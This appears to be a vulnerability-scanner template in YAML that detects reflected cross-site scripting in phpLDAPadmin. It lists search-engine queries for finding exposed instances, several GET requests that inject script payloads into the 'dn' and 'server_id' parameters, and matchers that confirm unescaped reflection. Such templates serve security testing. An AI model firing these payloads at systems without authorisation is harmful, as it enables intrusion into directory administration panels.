id: phpldapadmin-xss

info:
  name: phpLDAPadmin XSS
  author: rix4uni
  severity: medium
  description: phpLDAPadmin XSS
  reference:
    - https://twitter.com/Godfatherrix4uni/status/1701392754251563477
  metadata:
    google-query:
      - intitle:"phpLDAPadmin"
    shodan-query:
      - http.title:"phpLDAPadmin"
    censys-query:
      - services.http.response.html_title="phpLDAPadmin"
    fofa-query:
      - title="phpLDAPadmin"
    hunter-query:
      - web.title="phpLDAPadmin"
  tags: phpldapadmin

http:
  - method: GET
    path:
      - "{{BaseURL}}/phpldapadmin/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1"
      - "{{BaseURL}}/phpldapadmin/cmd.php?server_id=<script>alert('rix4uni')</script>"
      - "{{BaseURL}}/cmd.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1"
      - "{{BaseURL}}/cmd.php?server_id=<script>alert('rix4uni')</script>"
      - "{{BaseURL}}/phpldapadmin/index.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1"
      - "{{BaseURL}}/phpldapadmin/index.php?server_id=<script>alert('rix4uni')</script>"
      # - "{{BaseURL}}/index.php?cmd=template_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27rix4uni%27)%3C/ScRiPt%3E&meth=ajax&server_id=1"
      # - "{{BaseURL}}/index.php?server_id=<script>alert('rix4uni')</script>"

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "alert(%27rix4uni%27)"
          - "alert('rix4uni')"

      - type: word
        part: body
        words:
          - "&gt;alert('rix4uni')&lt"
        negative: true

      - type: status
        status:
          - 200